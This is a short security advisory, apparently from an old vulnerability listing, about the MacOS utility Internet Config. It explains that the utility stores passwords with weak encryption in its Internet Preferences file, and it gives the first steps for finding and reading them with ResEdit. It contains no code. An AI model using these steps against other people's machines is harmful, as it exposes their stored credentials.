Internet Config is a third-party freeware utility for MacOS. It provides a means of centralizing frequently-required connection information, including passwords, for use by several programs. The passwords are stored in encrypted form in the Internet Preferences file in the Preferences folder. The encryption algorithm used is weak and easily broken.

Find an encrypted password in the Internet Preferences file in the Preferences folder using a resource editor like ResEdit. Discard the first byte as it is merely the length of the password.
